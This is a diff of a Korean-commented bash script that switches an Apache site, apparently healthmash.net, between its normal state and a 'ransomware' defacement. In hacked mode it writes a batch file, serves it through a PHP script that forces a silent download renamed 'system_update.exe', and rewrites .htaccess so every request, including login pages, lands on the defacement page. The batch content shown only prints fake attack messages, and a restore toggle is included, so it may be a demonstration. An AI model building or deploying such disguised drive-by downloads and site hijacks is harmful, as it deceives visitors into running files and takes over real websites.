@@ -1,16 +1,12 @@
 #!/bin/bash
 ###############################################################################
-# 완전히 숨겨진 다운로드 (경로 절대 안물어봄)
-# PHP로 강제 다운로드
+# 토글 스크립트 - 도메인 포함 모든 요청 리다이렉트
+# 정상 ↔ 해킹 (완전 자동 다운로드)
 ###############################################################################
 
 WWW="/var/www/html/public"
 BACKUP="/tmp/index_REAL.php"
-
-echo "╔═══════════════════════════════════════════════╗"
-echo "║   완전 자동 다운로드 (경로 안물어봄)         ║"
-echo "╚═══════════════════════════════════════════════╝"
-echo ""
+HTACCESS_BACKUP="/tmp/.htaccess_backup"
 
 # 서버에서 직접 실행하므로 IP 자동 감지
 echo "[*] 서버 IP 자동 감지 중..."
@@ -31,12 +27,46 @@ fi
 echo "✅ 대상 서버: $TARGET_SERVER (자동 감지)"
 echo ""
 
-# 원본 백업
-[ ! -f "$BACKUP" ] && [ -f "$WWW/index.php" ] && cp "$WWW/index.php" "$BACKUP" && echo "✅ 원본 백업"
+# 현재 상태 확인
+if grep -q "BLACKLOCK RANSOMWARE" "$WWW/index.php" 2>/dev/null; then
+    # 해킹 → 정상
+    echo "🔄 정상 사이트로 복구 중..."
+    if [ -f "$BACKUP" ]; then
+        cp "$BACKUP" "$WWW/index.php"
+        rm -f "$WWW/dl.php"
+        rm -rf "$WWW/downloads"
 
-# 1. 악성코드 생성
-mkdir -p $WWW/downloads
-cat > $WWW/downloads/malware.bat << 'EOF'
+        # .htaccess 복구 (원본이 있으면 복구, 없으면 삭제)
+        if [ -f "$HTACCESS_BACKUP" ]; then
+            cp "$HTACCESS_BACKUP" "$WWW/.htaccess"
+            echo "✅ .htaccess 복구"
+        else
+            rm -f "$WWW/.htaccess"
+            echo "✅ .htaccess 삭제"
+        fi
+
+        chown apache:apache "$WWW/index.php"
+        chmod 644 "$WWW/index.php"
+        systemctl restart httpd
+        echo "✅ 정상 사이트 복구 완료!"
+        echo "http://$TARGET_SERVER"
+        echo "http://healthmash.net"
+    else
+        echo "❌ 백업 파일 없음"
+    fi
+else
+    # 정상 → 해킹
+    echo "🔄 해킹 사이트로 전환 중..."
+
+    # 원본 백업
+    [ ! -f "$BACKUP" ] && cp "$WWW/index.php" "$BACKUP" && echo "✅ 원본 백업"
+
+    # .htaccess 백업 (있으면)
+    [ -f "$WWW/.htaccess" ] && [ ! -f "$HTACCESS_BACKUP" ] && cp "$WWW/.htaccess" "$HTACCESS_BACKUP" && echo "✅ .htaccess 백업"
+
+    # 1. 악성코드 생성
+    mkdir -p $WWW/downloads
+    cat > $WWW/downloads/malware.bat << 'EOF'
 @echo off
 title RANSOMWARE ATTACK
 color 0C
@@ -53,32 +83,24 @@ echo [+] Data Exfil: IN PROGRESS
 echo.
 pause
 EOF
+    chmod 644 $WWW/downloads/malware.bat
+    chown apache:apache $WWW/downloads/malware.bat
 
-chmod 644 $WWW/downloads/malware.bat
-chown apache:apache $WWW/downloads/malware.bat
-
-# 2. PHP 다운로드 스크립트 (강제 다운로드)
-cat > $WWW/dl.php << 'EOFPHP'
+    # 2. PHP 강제 다운로드 스크립트
+    cat > $WWW/dl.php << 'EOFPHP'
 <?php
-// 완전히 숨겨진 강제 다운로드 (경로 안물어봄)
+// 강제 다운로드 (경로 안물어봄)
 $file = __DIR__ . '/downloads/malware.bat';
 
 if (file_exists($file)) {
-    // 캐시 방지
     header('Cache-Control: no-cache, must-revalidate');
     header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
-
-    // 강제 다운로드 헤더
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="system_update.exe"');
     header('Content-Length: ' . filesize($file));
     header('Content-Transfer-Encoding: binary');
-
-    // 출력 버퍼 클리어
     ob_clean();
     flush();
-
-    // 파일 전송
     readfile($file);
     exit;
 } else {
@@ -87,13 +109,35 @@ if (file_exists($file)) {
 }
 ?>
 EOFPHP
+    chmod 644 $WWW/dl.php
+    chown apache:apache $WWW/dl.php
+    echo "✅ 강제 다운로드 PHP 생성"
 
-chmod 644 $WWW/dl.php
-chown apache:apache $WWW/dl.php
-echo "✅ 강제 다운로드 PHP 생성"
+    # 3. .htaccess 생성 - 모든 요청을 index.php로 리다이렉트
+    cat > $WWW/.htaccess << 'EOFHTACCESS'
+<IfModule mod_rewrite.c>
+    RewriteEngine On
 
-# 3. 해킹 페이지 생성
-cat > $WWW/index.php << 'EOFHTML'
+    # 실제 파일이 아니면 모두 index.php로 리다이렉트
+    # 단, dl.php와 downloads 디렉토리는 제외
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_URI} !^/dl\.php$
+    RewriteCond %{REQUEST_URI} !^/downloads/
+    RewriteRule ^(.*)$ /index.php [L,QSA]
+
+    # login.php, register.php 등 모든 PHP 파일을 index.php로 강제 리다이렉트
+    RewriteCond %{REQUEST_URI} \.(php)$ [NC]
+    RewriteCond %{REQUEST_URI} !^/index\.php$
+    RewriteCond %{REQUEST_URI} !^/dl\.php$
+    RewriteRule ^(.*)$ /index.php [L,QSA]
+</IfModule>
+EOFHTACCESS
+    chmod 644 $WWW/.htaccess
+    chown apache:apache $WWW/.htaccess
+    echo "✅ .htaccess 생성 (모든 요청 → index.php)"
+
+    # 4. 해킹 페이지
+    cat > $WWW/index.php << 'EOFHTML'
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -469,21 +513,20 @@ cat > $WWW/index.php << 'EOFHTML'
 </html>
 EOFHTML
 
-chmod 644 $WWW/index.php
-chown apache:apache $WWW/index.php
-echo "✅ 해킹 페이지 생성"
+    chmod 644 $WWW/index.php
+    chown apache:apache $WWW/index.php
+    systemctl restart httpd
+    echo "✅ 해킹 사이트로 전환 완료!"
+    echo ""
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "IP 접속: http://$TARGET_SERVER"
+    echo "도메인 접속: http://healthmash.net"
+    echo "→ 모든 요청이 해킹 페이지로 리다이렉트!"
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+fi
 
-# Apache 재시작
-systemctl restart httpd
-
 echo ""
-echo "╔═══════════════════════════════════════════════╗"
-echo "║   ✅ 완료!                                    ║"
-echo "╚═══════════════════════════════════════════════╝"
-echo ""
-echo "http://$TARGET_SERVER 접속"
-echo "→ 2초 후 자동 다운로드 (경로 절대 안물어봄!)"
-echo "→ 브라우저 기본 다운로드 폴더에 system_update.exe 생성"
-echo ""
-echo "복구: sudo cp $BACKUP $WWW/index.php && sudo systemctl restart httpd"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "토글: sudo bash ~/TOGGLE_MODERN_DOMAIN.sh"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
